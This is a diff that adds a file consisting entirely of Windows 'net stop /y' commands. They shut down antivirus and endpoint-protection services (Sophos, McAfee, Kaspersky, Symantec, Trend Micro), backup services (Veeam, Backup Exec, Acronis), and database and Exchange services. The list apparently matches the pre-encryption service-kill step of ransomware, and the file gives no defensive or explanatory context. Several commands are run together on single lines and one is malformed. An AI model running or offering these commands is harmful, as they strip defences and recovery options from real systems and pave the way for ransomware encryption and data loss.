@@ -1,0 +1,56 @@
+
+net stop “Symantec System Recovery” /y
+net stop Antivirus /y net stop SstpSvc /y net stop MSOLAP$SQL_2008 /y net stop TrueKeyServiceHelper /y net stop sacsvr /y net stop VeeamNFSSvc /y net stop FA_Scheduler /y
+net stop SAVAdminService /y net stop EPUpdateService /y net stop VeeamTransportSvc /y net stop “Sophos Health Service” /y
+net stop bedbg /y net stop MSSQLSERVER /y
+net stop KAVFS /y
+net stop Smcinst /y net stop MSSQLServerADHelper100 /y
+net stop TmCCSF /y
+net stop wbengine /y net stop SQLWriter /y
+net stop MSSQLFDLauncher$TPS /y net stop SmcService /y net stop ReportServer$TPSAMA /y net stop swi_update /y net stop AcrSch2Svc /y net stop MSSQL$SYSTEM_BGC /y net stop VeeamBrokerSvc /y net stop MSSQLFDLauncher$PROFXENGAGEMENT /y net stop VeeamDeploymentService /y net stop SQLAgent$TPS /y net stop DCAgent /y net stop “Sophos Message Router” /y
+net stop MSSQLFDLauncher$SBSMONITORING /y
+net stop wbengine /y net stop MySQL80 /y
+net stop MSOLAP$SYSTEM_BGC /y
+net stop ReportServer$TPS /y
+net stop MSSQL$ECWDB2 /y
+net stop SntpService /y net stop SQLSERVERAGENT /y
+net stop BackupExecManagementService /y net stop SMTPSvc /y net stop mfefire /y
+net stop BackupExecRPCService /y net stop MSSQL$VEEAMSQL2008R2 /y net stop klnagent /y net stop MSExchangeSA /y
+net stop MSSQLServerADHelper /y net stop SQLTELEMETRY /y
+net stop “Sophos Clean Service” /y
+net stop swi_update_64 /y
+net stop “Sophos Web Control Service” /y
+net stop EhttpSrv /y
+net stop POP3Svc /y net stop MSOLAP$TPSAMA /y net stop McAfeeEngineService /y net stop “Veeam Backup Catalog Data Service” / net stop MSSQL$SBSMONITORING /y
+net stop ReportServer$SYSTEM_BGC /y net stop AcronisAgent /y net stop KAVFSGT /y
+net stop BackupExecDeviceMediaService /y net stop MySQL57 /y
+net stop McAfeeFrameworkMcAfeeFramework /y net stop TrueKey /y
+net stop VeeamMountSvc /y net stop MsDtsServer110 /y net stop SQLAgent$BKUPEXEC /y net stop UI0Detect /y
+net stop ReportServer /y net stop SQLTELEMETRY$ECWDB2 /y net stop MSSQLFDLauncher$SYSTEM_BGC /y net stop MSSQL$BKUPEXEC /y net stop SQLAgent$PRACTTICEBGC /y net stop
+MSExchangeSRS /y net stop SQLAgent$VEEAMSQL2008R2 /y net stop McShield /y net stop SepMasterService /y
+net stop “Sophos MCS Client” /y
+net stop VeeamCatalogSvc /y
+net stop SQLAgent$SHAREPOINT /y net stop NetMsmqActivator /y net stop kavfsslp /y
+net stop tmlisten /y net stop ShMonitor /y net stop MsDtsServer /y net stop SQLAgent$SQL_2008 /y net stop SDRSVC /y
+net stop IISAdmin /y net stop SQLAgent$PRACTTICEMGT /y net stop BackupExecJobEngine /y net stop SQLAgent$VEEAMSQL2008R2 /y net stop BackupExecAgentBrowser /y net stop VeeamHvIntegrationSvc /y net stop masvc /y
+net stop W3Svc /y net stop “SQLsafe Backup Service” /y
+net stop SQLAgent$CXDB /y net stop SQLBrowser /y net stop MSSQLFDLauncher$SQL_2008 /y
+net stop VeeamBackupSvc /y net stop “Sophos Safestore Service” /y
+net stop svcGenericHost /y
+net stop ntrtscan /y
+net stop SQLAgent$VEEAMSQL2012 /y net stop MSExchangeMGMT /y net stop SamSs /y net stop MSExchangeES /y
+net stop MBAMService /y
+net stop EsgShKernel /y net stop ESHASRV /y net stop MSSQL$TPSAMA /y net stop SQLAgent$CITRIX_METAFRAME /y net stop VeeamCloudSvc /y net stop “Sophos File Scanner Service” /y
+net stop “Sophos Agent” /y
+net stop MBEndpointAgent /y net stop swi_service /y net stop MSSQL$PRACTICEMGT /y
+net stop SQLAgent$TPSAMA /y
+net stop McAfeeFramework /y net stop “Enterprise Client Service” /y
+net stop SQLAgent$SBSMONITORING /y
+net stop MSSQL$VEEAMSQL2012 /y
+net stop swi_filter /y
+net stop SQLSafeOLRService /y
+net stop BackupExecVSSProvider /y net stop VeeamEnterpriseManagerSvc /y net stop SQLAgent$SQLEXPRESS /y
+net stop OracleClientCache80 /y net stop MSSQL$PROFXENGAGEMENT /y
+net stop IMAP4Svc /y net stop ARSM /y
+net stop MSExchangeIS /y net stop AVP /y net stop MSSQLFDLauncher /y
+net stop MSExchangeMTA /y net stop TrueKeyScheduler /y net stop MSSQL$SOPHOS /y net stop “SQL Backups” /y
